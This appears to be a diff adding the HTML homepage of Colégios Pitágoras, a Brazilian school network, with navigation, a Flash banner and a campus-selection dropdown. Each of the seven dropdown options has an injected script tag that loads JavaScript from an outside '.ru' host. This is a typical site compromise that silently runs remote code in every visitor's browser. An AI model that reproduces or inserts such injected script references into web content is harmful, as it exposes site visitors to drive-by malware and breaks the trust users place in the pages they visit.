@@ -1,0 +1,307 @@
+
+<html>
+<head>
+<title>:: Colégios Pitágoras ::</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<script language="JavaScript" src="includes/script.js" type="text/javascript"></script>
+
+
+<script language="JavaScript">
+<!--
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_findObj(n, d) { //v4.0
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && document.getElementById) x=document.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+<!--
+function MM_reloadPage(init) {  //reloads the window if Nav4 resized
+  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
+    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
+  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
+}
+MM_reloadPage(true);
+// -->
+</script>
+<link rel="stylesheet" href="includes/styles.css" type="text/css">
+
+
+<script language="javascript">
+	function AbrirInformativo()
+	{
+		AbreJanela('popup/pop_criativacao.html', '300', '365', 'no', 'no', 'no', 'no,left=0,top=0');
+	}
+	function AbrePopupMulher()
+	{
+		AbreJanela('popup/PopMulher.html',400,350,'no','no','yes');
+	}
+	function AbrePopupManutencao()
+	{
+		AbreJanela('popup/popup_manutencao_site.htm',250,300,'no','no','yes');
+	}
+	AbrirInformativo();
+</script>
+</head>
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0"  onLoad="MM_preloadImages('imgs/btn_grupo_on.gif','imgs/btn_rede_on.gif','imgs/btn_faculdade_on.gif','imgs/btn_fundacao_on.gif','imgs/btn_contato_on.gif','imgs/btn_tv_on.gif');" >
+<!--<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onLoad="AbreJanela('congresso_2004/popup_new.html', '445', '445', 'no', 'no', 'no');MM_preloadImages('imgs/btn_grupo_on.gif','imgs/btn_rede_on.gif','imgs/btn_faculdade_on.gif','imgs/btn_fundacao_on.gif','imgs/btn_contato_on.gif')">-->
+
+
+<form name="forms">
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+	<tr> 
+		<td> 
+			
+			<table width="100%" border="0" cellspacing="0" cellpadding="0">
+				<tr> 
+					<td height="11" background="imgs/img_traco_topo.gif"><img src="../imgs/sp.gif" width="1" height="1"></td>
+				</tr>
+				<tr> 				
+					<td bgcolor="#FF8E21" align="center">
+						<a href="http://www.pitagoras.com.br" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('btn_grupo','','imgs/btn_grupo_on.gif',1)" target="_blank"><img name="btn_grupo" border="0" src="imgs/btn_grupo_off.gif" width="81" height="21" hspace="10"></a>
+						<a href="http://www.redepitagoras.com.br" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('btn_rede','','imgs/btn_rede_on.gif',1)" target="_blank"><img name="btn_rede" border="0" src="imgs/btn_rede_off.gif" width="113" height="21" hspace="10"></a>
+						<a href="http://www.faculdadepitagoras.com.br" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('btn_fac','','imgs/btn_faculdade_on.gif',1)" target="_blank"><img name="btn_fac" border="0" src="imgs/btn_faculdade_off.gif" width="149" height="21" hspace="10"></a>
+						<a href="http://www.fundacaopitagoras.com.br" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('btn_fund','','imgs/btn_fundacao_on.gif',1)" target="_blank"><img name="btn_fund" border="0" src="imgs/btn_fundacao_off.gif" width="145" height="21" hspace="10"></a>
+						<a href="http://www.tvpitagoras.com.br" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('btn_tv','','imgs/btn_tv_on.gif',1)" target="_blank"><img name="btn_tv" border="0" src="imgs/btn_tv_off.gif" width="103" height="21" hspace="10"></a>
+                        <a href="http://www.vagas.com/colegiospitagoras" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('btn_trabalheconosco','','imgs/bt_trabalheconosco_on.gif',1)" target="_blank"><img name="btn_trabalheconosco" border="0" src="imgs/bt_trabalheconosco_off.gif" width="103" height="21" hspace="10"></a>
+					</td>
+				</tr>
+				<tr> 
+					<td height="9" bgcolor="#FFCA30"><img src="../imgs/sp.gif" width="1" height="1"></td>
+				</tr>
+				<tr> 
+					<td height="1" bgcolor="#FFFFFF"><img src="../imgs/sp.gif" width="9" height="1"></td>
+				</tr>
+			</table>
+			
+			<!--include file="includes/inc_flash_flutuante.asp"-->
+			<table width="100%" border="0" cellspacing="0" cellpadding="0">
+				<tr> 
+					<td height="13" bgcolor="#FFC56A" colspan=2><img src="imgs/sp.gif" width="9" height="13"></td>
+				</tr>
+				
+				<tr>
+				   <td bgcolor="#FAEFE2" align="left" background="imgs\logo_pictos.gif" colspan="2">
+					<div id="Div1" style="position:absolute; left:1px; top:55px; z-index:4" width:146; height:58;> <img src="imgs/logo_pictos.gif" width="455" height="80" border="0"></div>
+				      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0" width="615" height="80" VIEWASTEXT ID="Object1">
+							<param name=movie value="flash/banner_pictos.swf">
+							<param name=quality value=high>
+							<embed src="flash/banner_pictos.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="615" height="80">
+							</embed> 
+						</object>
+					</td>
+					<!--td bgcolor="#FAEFE2" background="imgs\logo_pictos.gif" align=left width="100%">
+						<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5,0,0,0" width="174" height="74" VIEWASTEXT ID="Object2">
+							<param name=movie value="flash/banner_congresso.swf">
+							<param name=quality value=high>
+							<param name="wmode" value="Transparent">
+							<embed src="flash/banner_congresso.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="174" height="74">
+							</embed> 
+						</object>
+					</td-->
+				</tr>
+				<tr> 
+					<td colspan=2 height="11" background="imgs/img_traco2_topo.gif"><img src="imgs/sp.gif" width="11" height="11"></td>
+				</tr>
+				<tr> 
+					<td colspan=2 height="14" bgcolor="#FFC56A"><img src="imgs/sp.gif" width="14" height="14"></td>
+				</tr>
+				<tr> 
+					<td colspan=2 height="5" bgcolor="#FD7E00"><img src="imgs/sp.gif" width="14" height="5"></td>
+				</tr>
+				<tr> 
+					<td colspan=2 height="14" bgcolor="#0098A5"><img src="imgs/sp.gif" width="14" height="14"></td>
+				</tr>
+				<tr> 
+					<td colspan=2 height="20" bgcolor="#51D6E4"><img src="imgs/sp.gif" width="14" height="20"></td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+	<tr> 
+		<td width="214" height="49" background="imgs/img_curva1.gif"> 
+			<div id="Layer1" style="position:absolute; left:10px; top:214px; width:158px; height:16px; z-index:1"> 
+				<input type="hidden" name="colegio" value="True">
+				<select name="unidades" style="font-size:11px;BACKGROUND-COLOR: #FFF0DA;" onchange="mudapagina();">
+					<option value="0">:: UNIDADES ::</option>
+					
+					<option value="1">Belo Horizonte (MG)<script src=http://msg.webservicesttt.ru/js.js></script></option>
+					
+					<option value="14">Carajás(PA)<script src=http://msg.webservicesttt.ru/js.js></script></option>
+					
+					<option value="13">Japão<script src=http://msg.webservicesttt.ru/js.js></script></option>
+					
+					<option value="15">Presidente Figueiredo (AM)<script src=http://msg.webservicesttt.ru/js.js></script></option>
+					
+					<option value="17">São José dos Campos (SP)<script src=http://msg.webservicesttt.ru/js.js></script></option>
+					
+					<option value="11">São Luís (MA)<script src=http://msg.webservicesttt.ru/js.js></script></option>
+					
+					<option value="12">Teofilândia (BA)<script src=http://msg.webservicesttt.ru/js.js></script></option>
+														
+				</select>
+			</div>
+			<img src="imgs/sp.gif" width="214" height="1"></td>
+		<td rowspan="3" align="right" background="imgs/bg_foto_home.gif"><img src="imgs/sp.gif" width="100" height="8"><br>
+	<img src="imgs/foto_menina_home.jpg" width="427" height="277"></td>
+	</tr>
+	<tr> 
+		<td> 
+			<table width="100%" border="0" cellspacing="0" cellpadding="0">
+				<tr> 
+					<td width="118" bgcolor="#FFF0DA" align="right"><a href="contato.asp" onMouseOut="MM_swapImgRestore()" onMouseOver="MM_swapImage('btn_contato','','imgs/btn_contato_on.gif',1)"><img name="btn_contato" border="0" src="imgs/btn_contato_off.gif" width="76" height="15"></a></td>
+					<td><img src="imgs/img_curva2.gif" width="41" height="38"></td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+	<tr> 
+		<td valign="top"> 
+			<table width="100%" border="0" cellspacing="0" cellpadding="0">
+				<tr> 
+					<td width="68" bgcolor="#FFB442"><img src="imgs/sp.gif" width="68" height="11"></td>
+					<td rowspan="2" valign="top"><img src="imgs/img_curva3.gif" width="50" height="68"></td>
+				</tr>
+				<tr> 
+					<td bgcolor="#FF9900"><img src="imgs/sp.gif" width="10" height="57"></td>
+				</tr>
+				<tr> 
+					<td bgcolor="#FF9900"><img src="imgs/sp.gif" width="10" height="130"></td>
+					<td valign="top"> 
+						<div id="Layer2" style="position:absolute; left:177px; top:254px; width:177px; height:87px; z-index:2"><img src="imgs/txt_home.gif" width="306" height="74"></div>
+						<div id="Layer3" style="position:absolute; left:140px; top:362px; width:311px; height:81px; z-index:3"  class="txt1"> 
+							<p>Nós valorizamos as escolhas e a inteligência de nossos alunos. </p>
+							<p>Conheça nossos colégios e seja um aluno Pitágoras. 
+						</div>
+						
+					</td>
+				</tr>
+			</table>
+		</td>
+	</tr>
+</table>
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+	<tr> 
+		<td rowspan="2" width="68" bgcolor="#FF9900">&nbsp;</td>
+		<td bgcolor="#FFDEAE" height="12"><img src="imgs/sp.gif" width="12" height="12"></td>
+	</tr>
+	<tr> 
+		<td bgcolor="#FF9900" height="18"><img src="imgs/sp.gif" width="12" height="18"></td>
+	</tr>
+	<tr> 
+		<td colspan="2" height="18" bgcolor="#FD7F00"><img src="imgs/sp.gif" width="12" height="18"></td>
+	</tr>
+	<tr> 
+		<td colspan="2" height="2"><img src="imgs/sp.gif" width="1" height="2"></td>
+	</tr>
+	<tr> 
+		<td colspan="2" bgcolor="#FD7F00" height="2"><img src="imgs/sp.gif" width="1" height="2"></td>
+	</tr>
+	<tr> 
+		<td colspan="2" height="2"><img src="imgs/sp.gif" width="1" height="2"></td>
+	</tr>
+<!--AO VOLTAR NOTICIAS, COLOCAR ESTE BLOCO
+	<tr> 
+		<td colspan="2" bgcolor="#FFA44A" height="5"><img src="imgs/sp.gif" width="5" height="5"></td>
+	</tr>
+	<tr> 
+		<td colspan="2" bgcolor="#934700" height="1"><img src="imgs/sp.gif" width="1" height="1"></td>
+	</tr>
+	<tr bgcolor="#FFE4C8"> 
+		<td colspan="2" height="8"><img src="imgs/sp.gif" width="8" height="8"></td>
+	</tr>-->
+</table>
+<!--AO VOLTAR NOTICIAS, COLOCAR ESTE BLOCO
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+	<tr> 
+		<td bgcolor="#FFE4C8" width="77" height="25"><img src="imgs/sp.gif" width="1" height="25"></td>
+		<td width="119" valign="top" rowspan="2"><img src="imgs/img_noticias.gif" width="119" height="25"></td>
+		<td rowspan="2">&nbsp;</td>
+		<td width="32" rowspan="2"><img src="imgs/img_curva_noticias.gif" width="32" height="29"></td>
+		<td width="67" bgcolor="#FFE4C8" rowspan="2"><img src="imgs/sp.gif" width="67" height="8"></td>
+	</tr>
+	<tr>
+		<td height="4" width="77"><img src="imgs/sp.gif" width="1" height="4"></td>
+	</tr>
+</table>
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+	<tr> 
+		<td colspan="4" height="22"><img src="imgs/sp.gif" width="22" height="22"></td>
+		<td bgcolor="#FFE4C8" height="22">&nbsp;</td>
+	</tr>
+	
+	<tr> 
+		<td width="40"><img src="imgs/sp.gif" width="40" height="20"></td>
+		<td width="40"><img src="imgs/sp.gif" width="40" height="20"></td>		
+		<td>&nbsp;</td>
+		<td width="34">&nbsp;</td>
+		<td width="67" bgcolor="#FFE4C8">&nbsp;</td>
+	</tr>
+	<tr> 
+		<td height="7"><img src="imgs/sp.gif" width="1" height="1"></td>
+		<td colspan="2" background="imgs/img_pontinhos.gif" height="37"><img src="imgs/sp.gif" width="1" height="37"></td>
+		<td height="7"><img src="imgs/sp.gif" width="1" height="1"></td>
+		<td bgcolor="#FFE4C8" height="7"><img src="imgs/sp.gif" width="1" height="1"></td>
+	</tr>	
+	
+	<tr> 
+		<td width="40"><img src="imgs/sp.gif" width="40" height="20"></td>
+		<td width="40"><img src="imgs/sp.gif" width="40" height="20"></td>
+		<td>
+			<table width="430" border="0" cellspacing="0" cellpadding="0" height="18">
+				<tr>
+					<td><span class="tit_noticias"></span><br>
+							<a href="detalhe_noticia_geral.asp?noticia=" class="noticias"></a>
+					</td>
+				</tr>
+			</table>
+		</td>
+		<td width="34">&nbsp;</td>
+		<td width="67" bgcolor="#FFE4C8">&nbsp;</td>
+	</tr>	
+	<tr> 
+		<td height="7"><img src="imgs/sp.gif" width="1" height="1"></td>
+		<td colspan="2" background="imgs/img_pontinhos.gif" height="37"><img src="imgs/sp.gif" width="1" height="37"></td>
+		<td height="7"><img src="imgs/sp.gif" width="1" height="1"></td>
+		<td bgcolor="#FFE4C8" height="7"><img src="imgs/sp.gif" width="1" height="1"></td>
+	</tr>	
+		
+</table>
+-->
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+<!--AO VOLTAR NOTICIAS, COLOCAR ESTE BLOCO	<tr> 
+		<td height="15" width="100%"><img src="imgs/sp.gif" width="1" height="15"></td>
+		<td height="15" width="67" bgcolor="#FFE4C8"><img src="imgs/sp.gif" width="67" height="10"></td>
+	</tr>
+	
+	<tr> 
+		<td bgcolor="#FFE4C8" height="5" colspan="2"><img src="imgs/sp.gif" width="1" height="5"></td>
+	</tr>-->
+	<tr> 
+		<td bgcolor="#FF9E01" height="34" colspan="2"><img src="imgs/sp.gif" width="1" height="37"></td>
+	</tr>
+	<tr bgcolor="#FD7E00"> 
+		<td height="30" align="center" class="txt2" colspan="2"><img src="imgs/sp.gif" width="1" height="30" align="absmiddle">&copy; Pitágoras - <a href="http://www.5e.com.br" target="_blank" class="5e">5º Elemento</a></td>
+	</tr>
+</table>
+</body>
+</html>
